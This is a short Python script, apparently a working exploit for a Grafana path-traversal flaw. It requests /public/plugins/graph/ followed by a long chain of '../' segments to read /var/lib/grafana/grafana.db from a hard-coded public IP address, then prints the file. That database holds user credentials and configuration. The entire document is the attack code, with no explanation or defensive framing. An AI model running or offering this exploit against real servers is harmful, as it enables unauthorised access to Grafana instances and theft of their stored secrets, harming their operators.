import requests

url = 'http://123.60.66.194:3000/public/plugins/graph/../../../../../../../../../../../../../../../../../../var/lib/grafana/grafana.db'
header = {
'Cookie': 'redirect_to=%2F'
}

res = requests.get(url=url,headers=header)
print(res.text)